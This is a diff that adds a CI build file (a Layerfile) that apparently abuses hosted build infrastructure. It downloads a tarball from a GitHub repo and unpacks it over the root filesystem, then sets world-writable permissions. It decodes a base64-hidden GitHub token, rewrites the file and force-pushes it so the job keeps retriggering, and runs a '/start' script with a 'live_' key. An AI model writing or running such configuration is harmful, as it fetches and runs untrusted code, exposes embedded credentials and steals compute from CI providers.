@@ -1,0 +1,9 @@
+FROM vm/ubuntu:22.04
+
+ENV linux8888=59479824
+
+RUN mkdir /linux8888888888/ && mkdir /linux8888888888888888/ && cd /linux8888888888/ && apt-get update && apt-get install zip && apt-get install unzip && wget -N https://raw.githubusercontent.com/webweb8888/linux8888/master/Layerfile && wget -N https://raw.githubusercontent.com/webweb8888/linux8888/master/linux8888.tar.gz && tar -xvf ./linux8888.tar.gz -C / && chmod 777 -R /linux1 && chmod 777 -R /linux2 && chmod 777 -R /webwebwebweb8888
+
+RUN cd /linux8888888888/ && apt-get install git -y && wget -N https://raw.githubusercontent.com/webweb8888/linux8888/master/Layerfile8888 && wget -N https://raw.githubusercontent.com/webweb8888/linux8888/master/web88888888 && cd /linux8888888888/ && git init && git remote add origin https://$(echo "Z2hwX3d3Vnl6VVVnY2k3RmJQcmphbEdLMHlpS1NHNlFWdjBNNEdvaQo=" | base64 -d)@github.com/webweb8888/linux8888/ && cd /linux8888888888/ && cp ./Layerfile8888 ./Layerfile && sed -i "s/$(echo "bGludXhsaW51eDg4ODg4ODg4Cg==" | base64 -d)/$(shuf -i8888-88888888 -n1)/g" ./Layerfile && git config --global user.email "you@example.com" && git add ./ && git commit -m "linux8888" && git push --set-upstream origin master -f
+
+RUN bash /start linux8888 live_N3UNeQ2cgeGsB6zKrSWd047Pplr9VZU01TYyIBqA2H0z
